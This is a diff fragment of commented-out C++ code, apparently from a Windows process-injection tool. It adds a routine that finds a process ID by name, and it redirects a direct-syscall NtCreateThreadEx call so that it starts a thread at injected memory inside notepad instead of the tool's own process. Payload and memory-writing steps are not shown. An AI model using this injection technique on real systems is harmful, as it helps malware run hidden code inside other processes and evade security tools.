@@ -66,6 +66,28 @@
 //}
 //
 //
+//DWORD FindProcessId(const std::wstring& processName)
+//{
+//    PROCESSENTRY32 processEntry;
+//    processEntry.dwSize = sizeof(PROCESSENTRY32);
+//
+//    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+//    if (snapshot == INVALID_HANDLE_VALUE) return 0;
+//
+//    if (Process32First(snapshot, &processEntry)) {
+//        do {
+//            if (!_wcsicmp(processEntry.szExeFile, processName.c_str())) {
+//                CloseHandle(snapshot);
+//                return processEntry.th32ProcessID;
+//            }
+//        } while (Process32Next(snapshot, &processEntry));
+//    }
+//
+//    CloseHandle(snapshot);
+//    return 0; // Not found
+//}
+//
+//
 //
 //
 //int main(/*int argc, char** argv[]*/) {
@@ -212,7 +234,12 @@
 //
 //    // first our process
 //    HANDLE hProcess = NULL;
-//    DWORD pid = 1424; // PID of the process notepad
+//    /*DWORD pid = FindProcessId(L"notepad.exe");*/
+//     DWORD pid = 10860; // PID of the process notepad
+//    if (pid == 0) {
+//        printf("Process not found.\n");
+//        return 1;
+//	}
 //
 //    // then the client_id with the handle of our PID
 //    CLIENT_ID client_id;
@@ -263,7 +290,8 @@
 //
 //    //// Step 4 ////
 //
-//    NTSTATUS status_NtCT = my_asm_NTCreateThreadex(&hTread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), feur, NULL, FALSE, 0, 0, 0, NULL);
+//    //NTSTATUS status_NtCT = my_asm_NTCreateThreadex(&hTread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), feur, NULL, FALSE, 0, 0, 0, NULL);
+//    NTSTATUS status_NtCT = my_asm_NTCreateThreadex(&hTread, THREAD_ALL_ACCESS, NULL, hProcess, remoteMemory, NULL, FALSE, 0, 0, 0, NULL);
 //    if (status_NtCT != 0) {
 //        printf(" Execution in the remote thread failed. Error code: °x%08X\n", status_NtCT);
 //        return 1;
